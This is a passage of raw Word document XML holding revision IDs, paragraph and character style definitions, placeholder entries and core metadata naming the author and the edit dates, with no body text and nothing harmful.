    <w:rsid w:val="00BB1E78"/>
    <w:rsid w:val="00BB51D3"/>
    <w:rsid w:val="00BB5B3A"/>
    <w:rsid w:val="00BB6914"/>
    <w:rsid w:val="00BB7F54"/>
    <w:rsid w:val="00BC2871"/>
    <w:rsid w:val="00BC75CA"/>
    <w:rsid w:val="00BD14CE"/>
    <w:rsid w:val="00BD487B"/>
    <w:rsid w:val="00BD4E20"/>
    <w:rsid w:val="00BD5459"/>
    <w:rsid w:val="00BD575E"/>
    <w:rsid w:val="00BE16F0"/>
    <w:rsid w:val="00BE67F5"/>
    <w:rsid w:val="00BE6F3B"/>
    <w:rsid w:val="00BE7929"/>
    <w:rsid w:val="00BF014C"/>
    <w:rsid w:val="00BF295A"/>
    <w:rsid w:val="00BF2D25"/>
    <w:rsid w:val="00BF5381"/>
    <w:rsid w:val="00BF56F4"/>
    <w:rsid w:val="00BF5E4B"/>
    <w:rsid w:val="00C02E32"/>
    <w:rsid w:val="00C071EF"/>
    <w:rsid w:val="00C07F98"/>
    <w:rsid w:val="00C13A07"/>
    <w:rsid w:val="00C233A6"/>
    <w:rsid w:val="00C233F1"/>
    <w:rsid w:val="00C25CFC"/>
    <w:rsid w:val="00C26143"/>
    <w:rsid w:val="00C26D55"/>
    <w:rsid w:val="00C27142"/>
    <w:rsid w:val="00C31827"/>
    <w:rsid w:val="00C32AFF"/>
    <w:rsid w:val="00C3633C"/>
    <w:rsid w:val="00C41773"/>
    <w:rsid w:val="00C4541A"/>
    <w:rsid w:val="00C54694"/>
    <w:rsid w:val="00C60F5A"/>
    <w:rsid w:val="00C610F5"/>
    <w:rsid w:val="00C615B4"/>
    <w:rsid w:val="00C62EFA"/>
    <w:rsid w:val="00C6733D"/>
    <w:rsid w:val="00C72537"/>
    <w:rsid w:val="00C753D9"/>
    <w:rsid w:val="00C80A98"/>
    <w:rsid w:val="00C9049E"/>
    <w:rsid w:val="00C92020"/>
    <w:rsid w:val="00C94671"/>
    <w:rsid w:val="00CA020E"/>
    <w:rsid w:val="00CA3B52"/>
    <w:rsid w:val="00CA42D6"/>
    <w:rsid w:val="00CB1421"/>
    <w:rsid w:val="00CB4740"/>
    <w:rsid w:val="00CB67F5"/>
    <w:rsid w:val="00CC004A"/>
    <w:rsid w:val="00CC2785"/>
    <w:rsid w:val="00CD141B"/>
    <w:rsid w:val="00CD1DCB"/>
    <w:rsid w:val="00CD4B9B"/>
    <w:rsid w:val="00CD6944"/>
    <w:rsid w:val="00CE586B"/>
    <w:rsid w:val="00CF2EAC"/>
    <w:rsid w:val="00CF5AC4"/>
    <w:rsid w:val="00D00F51"/>
    <w:rsid w:val="00D0163F"/>
    <w:rsid w:val="00D023EA"/>
    <w:rsid w:val="00D02AEA"/>
    <w:rsid w:val="00D03507"/>
    <w:rsid w:val="00D068EF"/>
    <w:rsid w:val="00D07917"/>
    <w:rsid w:val="00D128CE"/>
    <w:rsid w:val="00D13CCD"/>
    <w:rsid w:val="00D14590"/>
    <w:rsid w:val="00D20A07"/>
    <w:rsid w:val="00D231C4"/>
    <w:rsid w:val="00D30E83"/>
    <w:rsid w:val="00D33E26"/>
    <w:rsid w:val="00D33F2B"/>
    <w:rsid w:val="00D43AA9"/>
    <w:rsid w:val="00D500C9"/>
    <w:rsid w:val="00D53343"/>
    <w:rsid w:val="00D625A7"/>
    <w:rsid w:val="00D6321C"/>
    <w:rsid w:val="00D657D7"/>
    <w:rsid w:val="00D65F09"/>
    <w:rsid w:val="00D7148B"/>
    <w:rsid w:val="00D715EE"/>
    <w:rsid w:val="00D750AC"/>
    <w:rsid w:val="00D75324"/>
    <w:rsid w:val="00D76F69"/>
    <w:rsid w:val="00D822A0"/>
    <w:rsid w:val="00D82898"/>
    <w:rsid w:val="00D8642A"/>
    <w:rsid w:val="00D90776"/>
    <w:rsid w:val="00D92F7B"/>
    <w:rsid w:val="00D9332C"/>
    <w:rsid w:val="00D95112"/>
    <w:rsid w:val="00D95490"/>
    <w:rsid w:val="00DA3618"/>
    <w:rsid w:val="00DA4CC5"/>
    <w:rsid w:val="00DD0D43"/>
    <w:rsid w:val="00DD2E33"/>
    <w:rsid w:val="00DD3EA7"/>
    <w:rsid w:val="00DD441E"/>
    <w:rsid w:val="00DD4431"/>
    <w:rsid w:val="00DE0A5D"/>
    <w:rsid w:val="00DE24BD"/>
    <w:rsid w:val="00DE42D1"/>
    <w:rsid w:val="00DE508E"/>
    <w:rsid w:val="00DE69C4"/>
    <w:rsid w:val="00DF0070"/>
    <w:rsid w:val="00DF13AD"/>
    <w:rsid w:val="00DF24C1"/>
    <w:rsid w:val="00DF667F"/>
    <w:rsid w:val="00E02E8F"/>
    <w:rsid w:val="00E02EE1"/>
    <w:rsid w:val="00E07011"/>
    <w:rsid w:val="00E1415B"/>
    <w:rsid w:val="00E177C9"/>
    <w:rsid w:val="00E21A84"/>
    <w:rsid w:val="00E40B50"/>
    <w:rsid w:val="00E50E48"/>
    <w:rsid w:val="00E523F8"/>
    <w:rsid w:val="00E525EF"/>
    <w:rsid w:val="00E540B6"/>
    <w:rsid w:val="00E55898"/>
    <w:rsid w:val="00E55B4F"/>
    <w:rsid w:val="00E61D59"/>
    <w:rsid w:val="00E634CF"/>
    <w:rsid w:val="00E717C9"/>
    <w:rsid w:val="00E720B9"/>
    <w:rsid w:val="00E76707"/>
    <w:rsid w:val="00E77246"/>
    <w:rsid w:val="00E83527"/>
    <w:rsid w:val="00E85AC5"/>
    <w:rsid w:val="00E874B6"/>
    <w:rsid w:val="00E87B6E"/>
    <w:rsid w:val="00EA086D"/>
    <w:rsid w:val="00EA0A91"/>
    <w:rsid w:val="00EA11E8"/>
    <w:rsid w:val="00EA27D3"/>
    <w:rsid w:val="00EA2995"/>
    <w:rsid w:val="00EB25CC"/>
    <w:rsid w:val="00EB4D8D"/>
    <w:rsid w:val="00EB7266"/>
    <w:rsid w:val="00EC19BA"/>
    <w:rsid w:val="00EC4170"/>
    <w:rsid w:val="00EC76D5"/>
    <w:rsid w:val="00EC7C39"/>
    <w:rsid w:val="00ED0ED2"/>
    <w:rsid w:val="00ED270A"/>
    <w:rsid w:val="00ED39E3"/>
    <w:rsid w:val="00ED6650"/>
    <w:rsid w:val="00ED773C"/>
    <w:rsid w:val="00EE0859"/>
    <w:rsid w:val="00EE5066"/>
    <w:rsid w:val="00EE645F"/>
    <w:rsid w:val="00EE79EE"/>
    <w:rsid w:val="00EF0319"/>
    <w:rsid w:val="00EF0725"/>
    <w:rsid w:val="00EF2CBD"/>
    <w:rsid w:val="00EF322F"/>
    <w:rsid w:val="00EF7AA0"/>
    <w:rsid w:val="00F02BE1"/>
    <w:rsid w:val="00F04B41"/>
    <w:rsid w:val="00F0728A"/>
    <w:rsid w:val="00F0757A"/>
    <w:rsid w:val="00F1149E"/>
    <w:rsid w:val="00F117F5"/>
    <w:rsid w:val="00F146AB"/>
    <w:rsid w:val="00F15213"/>
    <w:rsid w:val="00F171CC"/>
    <w:rsid w:val="00F179EA"/>
    <w:rsid w:val="00F2485F"/>
    <w:rsid w:val="00F340FB"/>
    <w:rsid w:val="00F344FB"/>
    <w:rsid w:val="00F34931"/>
    <w:rsid w:val="00F34FEA"/>
    <w:rsid w:val="00F350C9"/>
    <w:rsid w:val="00F36402"/>
    <w:rsid w:val="00F36D97"/>
    <w:rsid w:val="00F419A4"/>
    <w:rsid w:val="00F41D91"/>
    <w:rsid w:val="00F421CB"/>
    <w:rsid w:val="00F455EF"/>
    <w:rsid w:val="00F45755"/>
    <w:rsid w:val="00F46B3A"/>
    <w:rsid w:val="00F46BBD"/>
    <w:rsid w:val="00F47133"/>
    <w:rsid w:val="00F50828"/>
    <w:rsid w:val="00F51A92"/>
    <w:rsid w:val="00F524DB"/>
    <w:rsid w:val="00F534F4"/>
    <w:rsid w:val="00F550AE"/>
    <w:rsid w:val="00F63BAC"/>
    <w:rsid w:val="00F63DC7"/>
    <w:rsid w:val="00F67BB4"/>
    <w:rsid w:val="00F7028A"/>
    <w:rsid w:val="00F729AD"/>
    <w:rsid w:val="00F748B6"/>
    <w:rsid w:val="00F77B47"/>
    <w:rsid w:val="00F81442"/>
    <w:rsid w:val="00F87F78"/>
    <w:rsid w:val="00F9029F"/>
    <w:rsid w:val="00F91380"/>
    <w:rsid w:val="00F919F1"/>
    <w:rsid w:val="00F95693"/>
    <w:rsid w:val="00F97A82"/>
    <w:rsid w:val="00FA501E"/>
    <w:rsid w:val="00FA64AA"/>
    <w:rsid w:val="00FA7480"/>
    <w:rsid w:val="00FB003D"/>
    <w:rsid w:val="00FB0D00"/>
    <w:rsid w:val="00FB2A3E"/>
    <w:rsid w:val="00FB50CC"/>
    <w:rsid w:val="00FB6E11"/>
    <w:rsid w:val="00FC1A82"/>
    <w:rsid w:val="00FC35F9"/>
    <w:rsid w:val="00FC54D7"/>
    <w:rsid w:val="00FC6C9A"/>
    <w:rsid w:val="00FD0126"/>
    <w:rsid w:val="00FD0AE9"/>
    <w:rsid w:val="00FD3ACB"/>
    <w:rsid w:val="00FD43CA"/>
    <w:rsid w:val="00FD507D"/>
    <w:rsid w:val="00FD5CE2"/>
    <w:rsid w:val="00FD676D"/>
    <w:rsid w:val="00FD6FF6"/>
    <w:rsid w:val="00FD7EC2"/>
    <w:rsid w:val="00FD7FB3"/>
    <w:rsid w:val="00FE00B6"/>
    <w:rsid w:val="00FE1F5C"/>
    <w:rsid w:val="00FE2E7E"/>
    <w:rsid w:val="00FE67A1"/>
    <w:rsid w:val="00FE73BC"/>
    <w:rsid w:val="00FF0071"/>
    <w:rsid w:val="00FF4E3A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FCA0D56"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{6A0DAA2F-2867-4129-8061-E658B60D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CC2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045CC2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045CC2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045CC2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link w:val="Heading4Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="00DE69C4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  <w:rsid w:val="00045CC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45CC2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="EnvelopeReturn">
    <w:name w:val="envelope return"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00BB6914"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Arial" w:cstheme="majorBidi"/>
      <w:b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B69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b/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading2Char">
    <w:name w:val="Heading 2 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading2"/>
    <w:rsid w:val="00DE69C4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E69C4"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Times New Roman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69C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E69C4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DE69C4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DE69C4"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00045CC2"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:rsid w:val="00045CC2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DE69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E69C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E69C4"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Arial Unicode MS" w:hAnsi="Arial" w:cs="Times New Roman"/>
      <w:b/>
      <w:kern w:val="28"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:rsid w:val="00045CC2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E69C4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045CC2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DE69C4"/>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Outlinenumbering">
    <w:name w:val="Outline numbering"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00045CC2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045CC2"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00045CC2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00045CC2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45CC2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5CC2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45CC2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45CC2"/>
    <w:pPr>
      <w:spacing w:after="100" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="403"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="TableGrid">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="39"/>
    <w:rsid w:val="00755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45CC2"/>
    <w:pPr>
      <w:spacing w:before="80" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hgkelc">
    <w:name w:val="hgkelc"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008C5D20"/>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0076233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E5FE4"/>
    <w:rPr>
      <w:color w:val="808080"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Red">
    <w:name w:val="Red"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="1"/>
    <w:rsid w:val="005E5FE4"/>
    <w:rPr>
      <w:color w:val="FF0000"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="kw2">
    <w:name w:val="kw2"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00D95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2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3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4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8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6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2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3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8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2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0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1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6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7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6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5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8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95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9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7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2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5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7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0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2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5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6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6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4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4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7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2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8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8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0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9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8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2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2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6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6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23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6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4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8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2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4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FA8C42004A940BD89C1AE92F337D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BDF70-C833-400B-9041-5361CEB50991}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00AA6F64" w:rsidRDefault="00567172" w:rsidP="00567172">
          <w:pPr>
            <w:pStyle w:val="BFA8C42004A940BD89C1AE92F337DDCB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74BCA74309EB4A919C62E92F0CD99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05972-916E-4F41-A3EB-F8E0C726DE3B}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00AA6F64" w:rsidRDefault="00567172" w:rsidP="00567172">
          <w:pPr>
            <w:pStyle w:val="74BCA74309EB4A919C62E92F0CD99336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B62BBBB971D14AFE8965FBFB44CFA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8295E-4E8C-4772-B356-DA322B2FBF00}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00AA6F64" w:rsidRDefault="00567172" w:rsidP="00567172">
          <w:pPr>
            <w:pStyle w:val="B62BBBB971D14AFE8965FBFB44CFA1AF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65D69C1F62FB4618823D41D1E2664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8C4BE-80A8-4C2E-ACF2-7D4EA8C6E3BA}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00AA6F64" w:rsidRDefault="00567172" w:rsidP="00567172">
          <w:pPr>
            <w:pStyle w:val="65D69C1F62FB4618823D41D1E26643F0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C84F304B18224A539B33663F7EB2F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37704-36BB-420E-BA4B-A9206ECBD2C2}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00F201B7" w:rsidRDefault="00AA6F64" w:rsidP="00AA6F64">
          <w:pPr>
            <w:pStyle w:val="C84F304B18224A539B33663F7EB2FD9D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D624295EE1346A79EEC54010ACCB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27A68-7F36-4B06-A7EC-56473F7136C6}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00F201B7" w:rsidRDefault="00AA6F64" w:rsidP="00AA6F64">
          <w:pPr>
            <w:pStyle w:val="FD624295EE1346A79EEC54010ACCB53F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65C7F7C8C14D4131AB26DBEB54E75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E5028-2799-4D26-B887-004246A2F638}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00F201B7" w:rsidRDefault="00AA6F64" w:rsidP="00AA6F64">
          <w:pPr>
            <w:pStyle w:val="65C7F7C8C14D4131AB26DBEB54E75D4F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72"/>
    <w:rsid w:val="00567172"/>
    <w:rsid w:val="008509FA"/>
    <w:rsid w:val="00AA6F64"/>
    <w:rsid w:val="00F2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F64"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="BFA8C42004A940BD89C1AE92F337DDCB">
    <w:name w:val="BFA8C42004A940BD89C1AE92F337DDCB"/>
    <w:rsid w:val="00567172"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="74BCA74309EB4A919C62E92F0CD99336">
    <w:name w:val="74BCA74309EB4A919C62E92F0CD99336"/>
    <w:rsid w:val="00567172"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="B62BBBB971D14AFE8965FBFB44CFA1AF">
    <w:name w:val="B62BBBB971D14AFE8965FBFB44CFA1AF"/>
    <w:rsid w:val="00567172"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="65D69C1F62FB4618823D41D1E26643F0">
    <w:name w:val="65D69C1F62FB4618823D41D1E26643F0"/>
    <w:rsid w:val="00567172"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="C84F304B18224A539B33663F7EB2FD9D">
    <w:name w:val="C84F304B18224A539B33663F7EB2FD9D"/>
    <w:rsid w:val="00AA6F64"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="FD624295EE1346A79EEC54010ACCB53F">
    <w:name w:val="FD624295EE1346A79EEC54010ACCB53F"/>
    <w:rsid w:val="00AA6F64"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="65C7F7C8C14D4131AB26DBEB54E75D4F">
    <w:name w:val="65C7F7C8C14D4131AB26DBEB54E75D4F"/>
    <w:rsid w:val="00AA6F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50B-43F4-4092-857D-93E80198C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834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Loring</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>William Loring</cp:lastModifiedBy>
  <cp:revision>770</cp:revision>
  <cp:lastPrinted>2025-03-01T20:53:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-12-02T20:52:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-03-01T20:53:00Z</dcterms:modified>
</cp:coreProperties>
</file>